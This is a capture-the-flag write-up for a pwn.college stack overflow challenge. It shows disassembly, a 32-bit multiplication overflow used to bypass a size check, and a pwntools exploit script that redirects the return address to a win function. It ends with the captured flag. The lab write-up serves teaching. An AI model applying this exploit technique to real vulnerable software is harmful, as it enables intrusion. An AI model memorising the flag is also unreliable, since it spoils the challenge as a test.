# level5.1
## Description
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
## Solution
The challenge file's name is `babymem-level-5-1`. Running `objdump -d -M intel babymem-level-5-1` inside `/challenge` and looking at the `challenge` function:
```
0000000000401fdd <challenge>:
  401fdd:       f3 0f 1e fa             endbr64
  401fe1:       55                      push   rbp
  401fe2:       48 89 e5                mov    rbp,rsp
  401fe5:       48 83 ec 60             sub    rsp,0x60
  401fe9:       89 7d bc                mov    DWORD PTR [rbp-0x44],edi
  401fec:       48 89 75 b0             mov    QWORD PTR [rbp-0x50],rsi
  401ff0:       48 89 55 a8             mov    QWORD PTR [rbp-0x58],rdx
  401ff4:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  401ffb:       00 
  401ffc:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  402003:       00 
  402004:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  40200b:       00 
  40200c:       66 c7 45 e8 00 00       mov    WORD PTR [rbp-0x18],0x0
  402012:       c6 45 ea 00             mov    BYTE PTR [rbp-0x16],0x0
  402016:       48 8d 45 d0             lea    rax,[rbp-0x30]
  40201a:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  40201e:       48 c7 45 f0 00 00 00    mov    QWORD PTR [rbp-0x10],0x0
  402025:       00 
  402026:       48 8d 3d e3 10 00 00    lea    rdi,[rip+0x10e3]        # 403110 <_IO_stdin_used+0x110>
  40202d:       b8 00 00 00 00          mov    eax,0x0
  402032:       e8 09 f1 ff ff          call   401140 <printf@plt>
  402037:       48 8d 45 cc             lea    rax,[rbp-0x34]
  40203b:       48 89 c6                mov    rsi,rax
  40203e:       48 8d 3d ef 10 00 00    lea    rdi,[rip+0x10ef]        # 403134 <_IO_stdin_used+0x134>
  402045:       b8 00 00 00 00          mov    eax,0x0
  40204a:       e8 51 f1 ff ff          call   4011a0 <__isoc99_scanf@plt>
  40204f:       8b 45 cc                mov    eax,DWORD PTR [rbp-0x34]
  402052:       85 c0                   test   eax,eax
  402054:       75 1f                   jne    402075 <challenge+0x98>
  402056:       48 8d 0d db 11 00 00    lea    rcx,[rip+0x11db]        # 403238 <__PRETTY_FUNCTION__.5714>
  40205d:       ba 49 00 00 00          mov    edx,0x49
  402062:       48 8d 35 cf 10 00 00    lea    rsi,[rip+0x10cf]        # 403138 <_IO_stdin_used+0x138>
  402069:       48 8d 3d e7 10 00 00    lea    rdi,[rip+0x10e7]        # 403157 <_IO_stdin_used+0x157>
  402070:       e8 db f0 ff ff          call   401150 <__assert_fail@plt>
  402075:       48 8d 3d ea 10 00 00    lea    rdi,[rip+0x10ea]        # 403166 <_IO_stdin_used+0x166>
  40207c:       b8 00 00 00 00          mov    eax,0x0
  402081:       e8 ba f0 ff ff          call   401140 <printf@plt>
  402086:       48 8d 45 c8             lea    rax,[rbp-0x38]
  40208a:       48 89 c6                mov    rsi,rax
  40208d:       48 8d 3d a0 10 00 00    lea    rdi,[rip+0x10a0]        # 403134 <_IO_stdin_used+0x134>
  402094:       b8 00 00 00 00          mov    eax,0x0
  402099:       e8 02 f1 ff ff          call   4011a0 <__isoc99_scanf@plt>
  40209e:       8b 45 c8                mov    eax,DWORD PTR [rbp-0x38]
  4020a1:       85 c0                   test   eax,eax
  4020a3:       75 1f                   jne    4020c4 <challenge+0xe7>
  4020a5:       48 8d 0d 8c 11 00 00    lea    rcx,[rip+0x118c]        # 403238 <__PRETTY_FUNCTION__.5714>
  4020ac:       ba 4c 00 00 00          mov    edx,0x4c
  4020b1:       48 8d 35 80 10 00 00    lea    rsi,[rip+0x1080]        # 403138 <_IO_stdin_used+0x138>
  4020b8:       48 8d 3d c5 10 00 00    lea    rdi,[rip+0x10c5]        # 403184 <_IO_stdin_used+0x184>
  4020bf:       e8 8c f0 ff ff          call   401150 <__assert_fail@plt>
  4020c4:       8b 55 c8                mov    edx,DWORD PTR [rbp-0x38]
  4020c7:       8b 45 cc                mov    eax,DWORD PTR [rbp-0x34]
  4020ca:       0f af c2                imul   eax,edx
  4020cd:       83 f8 1b                cmp    eax,0x1b
  4020d0:       76 1f                   jbe    4020f1 <challenge+0x114>
  4020d2:       48 8d 0d 5f 11 00 00    lea    rcx,[rip+0x115f]        # 403238 <__PRETTY_FUNCTION__.5714>
  4020d9:       ba 4d 00 00 00          mov    edx,0x4d
  4020de:       48 8d 35 53 10 00 00    lea    rsi,[rip+0x1053]        # 403138 <_IO_stdin_used+0x138>
  4020e5:       48 8d 3d ac 10 00 00    lea    rdi,[rip+0x10ac]        # 403198 <_IO_stdin_used+0x198>
  4020ec:       e8 5f f0 ff ff          call   401150 <__assert_fail@plt>
  4020f1:       8b 45 cc                mov    eax,DWORD PTR [rbp-0x34]
  4020f4:       89 c0                   mov    eax,eax
  4020f6:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
  4020fa:       8b 45 c8                mov    eax,DWORD PTR [rbp-0x38]
  4020fd:       89 c2                   mov    edx,eax
  4020ff:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  402103:       48 0f af c2             imul   rax,rdx
  402107:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
  40210b:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  40210f:       48 89 c6                mov    rsi,rax
  402112:       48 8d 3d 9f 10 00 00    lea    rdi,[rip+0x109f]        # 4031b8 <_IO_stdin_used+0x1b8>
  402119:       b8 00 00 00 00          mov    eax,0x0
  40211e:       e8 1d f0 ff ff          call   401140 <printf@plt>
  402123:       48 8b 55 f0             mov    rdx,QWORD PTR [rbp-0x10]
  402127:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  40212b:       48 89 c6                mov    rsi,rax
  40212e:       bf 00 00 00 00          mov    edi,0x0
  402133:       e8 38 f0 ff ff          call   401170 <read@plt>
  402138:       89 45 ec                mov    DWORD PTR [rbp-0x14],eax
  40213b:       83 7d ec 00             cmp    DWORD PTR [rbp-0x14],0x0
  40213f:       79 2c                   jns    40216d <challenge+0x190>
  402141:       e8 ca ef ff ff          call   401110 <__errno_location@plt>
  402146:       8b 00                   mov    eax,DWORD PTR [rax]
  402148:       89 c7                   mov    edi,eax
  40214a:       e8 71 f0 ff ff          call   4011c0 <strerror@plt>
  40214f:       48 89 c6                mov    rsi,rax
  402152:       48 8d 3d 87 10 00 00    lea    rdi,[rip+0x1087]        # 4031e0 <_IO_stdin_used+0x1e0>
  402159:       b8 00 00 00 00          mov    eax,0x0
  40215e:       e8 dd ef ff ff          call   401140 <printf@plt>
  402163:       bf 01 00 00 00          mov    edi,0x1
  402168:       e8 43 f0 ff ff          call   4011b0 <exit@plt>
  40216d:       48 8d 3d 90 10 00 00    lea    rdi,[rip+0x1090]        # 403204 <_IO_stdin_used+0x204>
  402174:       e8 a7 ef ff ff          call   401120 <puts@plt>
  402179:       b8 00 00 00 00          mov    eax,0x0
  40217e:       c9                      leave
  40217f:       c3                      ret
```
- We see that the buffer starts from [rbp-0x30]. This means that there are 48 bytes between the buffer and the saved base pointer.
- Similar to [level5.0](./level5.0.md), passing a payload of 64 bytes (where the last 8 bytes are the address of the win function) will overwrite the return address with the address of the win function and get the flag.
- From the disassembly, I noted that the win function is at `0x00000000000401ed6`.
- Also, we'll use the same large values of `2147483647` to bypass the checks.
- Wrote the exploit script:
```python
import pwn

padding = b'A' * 56
payload = padding + pwn.p64(0x0000000000401ed6)

r = pwn.process('/challenge/babymem-level-5-1')
r.recvuntil('send: ')
r.sendline('2147483647')
r.recvuntil('record: ')
r.sendline('2147483647')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- Running the script will give us the flag: `pwn.college{EFrz6OV6_et-_X01LbVT76vaxvC.0FO5IDL5QTO0czW}`.